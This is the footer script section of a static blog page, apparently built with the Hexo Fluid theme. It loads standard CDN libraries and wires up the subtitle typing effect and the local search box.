  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
